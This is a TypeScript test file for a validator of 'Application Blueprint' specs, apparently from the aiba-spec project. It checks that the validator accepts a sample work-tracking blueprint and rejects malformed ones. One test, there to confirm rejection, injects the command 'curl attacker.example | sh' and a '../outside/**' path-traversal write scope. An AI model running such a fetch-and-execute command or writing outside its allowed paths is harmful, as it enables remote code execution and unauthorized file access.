import { describe, expect, it } from "vitest";
import type { ApplicationBlueprint } from "aiba-spec";
import { assertApplicationBlueprintSemantics } from "./application-blueprint.js";
import { validateApplicationBlueprint } from "./validation.js";

function blueprint(): ApplicationBlueprint {
  return {
    apiVersion: "aiba.dev/v0alpha1",
    kind: "ApplicationBlueprint",
    metadata: {
      id: "work-hub",
      version: "0.1.0",
      title: "Work Hub",
      description: "A domain-neutral collaboration application.",
    },
    spec: {
      requirements: [
        { capability: "notification", version: "^0.2.0", reason: "Notify assigned actors." },
      ],
      resources: [{
        id: "workspace",
        title: "Workspace",
        fields: [
          { id: "name", type: "string", required: true, sensitive: false, maxLength: 120 },
        ],
        relationships: [],
      }, {
        id: "work-item",
        title: "Work Item",
        fields: [
          { id: "title", type: "string", required: true, sensitive: false, maxLength: 200 },
          { id: "workspace", type: "reference", required: true, sensitive: false, targetResource: "workspace" },
          { id: "status", type: "enum", required: true, sensitive: false, dictionary: "work-status" },
          { id: "attachment", type: "asset", required: false, sensitive: true },
        ],
        relationships: [{
          id: "belongs-to",
          targetResource: "workspace",
          kind: "one-to-many",
          onDelete: "restrict",
        }],
        stateMachine: {
          initial: "open",
          states: [{ id: "open", terminal: false }, { id: "done", terminal: true }],
          transitions: [{ id: "complete", from: "open", to: "done", operation: "complete-item" }],
        },
      }],
      operations: [{
        id: "create-item",
        resource: "work-item",
        kind: "create",
        authorization: { action: "work-item.create" },
        inputFields: ["title", "workspace", "status", "attachment"],
        outputFields: ["title", "workspace", "status"],
        idempotent: true,
        emits: ["item-created"],
      }, {
        id: "complete-item",
        resource: "work-item",
        kind: "transition",
        authorization: { action: "work-item.complete" },
        inputFields: [],
        outputFields: ["status"],
        idempotent: true,
        emits: [],
      }],
      events: [{
        id: "item-created",
        operation: "create-item",
        payloadFields: ["title", "status"],
        triggers: [{ capability: "notification", action: "send", delivery: "asynchronous" }],
      }],
      ui: {
        surfaces: [{
          id: "item-list",
          kind: "list",
          resource: "work-item",
          fields: ["title", "status"],
          operations: ["create-item", "complete-item"],
          features: ["search", "filters", "pagination", "tags"],
        }],
      },
      acceptance: [{
        id: "tenant-scope-enforced",
        title: "Tenant scope is derived from trusted context",
        severity: "critical",
        evidence: {
          requiredTypes: ["source", "test"],
          minimum: 2,
          pathPatterns: ["src/**", "test/**"],
        },
      }],
      adaptation: { writeScopes: ["src/**", "test/**"] },
    },
  };
}

describe("Application Blueprint protocol", () => {
  it("accepts a complete framework-neutral application intent", () => {
    const value = validateApplicationBlueprint(blueprint());
    expect(assertApplicationBlueprintSemantics(value).metadata.id).toBe("work-hub");
  });

  it("rejects executable commands, unsafe paths, and unknown fields", () => {
    expect(() => validateApplicationBlueprint({
      ...blueprint(),
      command: "curl attacker.example | sh",
    })).toThrowError(expect.objectContaining({ code: "PROTOCOL_VALIDATION_FAILED" }));

    const unsafe = structuredClone(blueprint());
    unsafe.spec.adaptation.writeScopes = ["../outside/**"];
    expect(() => validateApplicationBlueprint(unsafe)).toThrowError(expect.objectContaining({
      code: "PROTOCOL_VALIDATION_FAILED",
    }));
  });

  it("rejects duplicates and dangling resource, field, state, event, and UI references", () => {
    const duplicate = blueprint();
    duplicate.spec.resources.push(structuredClone(duplicate.spec.resources[0]!));
    expect(() => assertApplicationBlueprintSemantics(duplicate)).toThrowError(expect.objectContaining({
      code: "APPLICATION_BLUEPRINT_INVALID",
    }));

    const dangling = blueprint();
    dangling.spec.operations[0]!.inputFields.push("missingField");
    expect(() => assertApplicationBlueprintSemantics(dangling)).toThrow("unknown field missingField");

    const inconsistentEvent = blueprint();
    inconsistentEvent.spec.events[0]!.operation = "complete-item";
    expect(() => assertApplicationBlueprintSemantics(inconsistentEvent)).toThrow("inconsistent event");

    const badTransition = blueprint();
    badTransition.spec.resources[1]!.stateMachine!.transitions[0]!.to = "missing";
    expect(() => assertApplicationBlueprintSemantics(badTransition)).toThrow("unknown state");

    const badSurface = blueprint();
    badSurface.spec.ui.surfaces[0]!.resource = "missing";
    expect(() => assertApplicationBlueprintSemantics(badSurface)).toThrow("unknown resource");
  });

  it("rejects inconsistent field constraints", () => {
    const value = blueprint();
    value.spec.resources[1]!.fields[2]!.dictionary = undefined;
    expect(() => assertApplicationBlueprintSemantics(value)).toThrow("must use dictionary");

    const bounds = blueprint();
    bounds.spec.resources[1]!.fields[0]!.minimum = 10;
    bounds.spec.resources[1]!.fields[0]!.maximum = 1;
    expect(() => assertApplicationBlueprintSemantics(bounds)).toThrow("minimum exceeds maximum");
  });
});
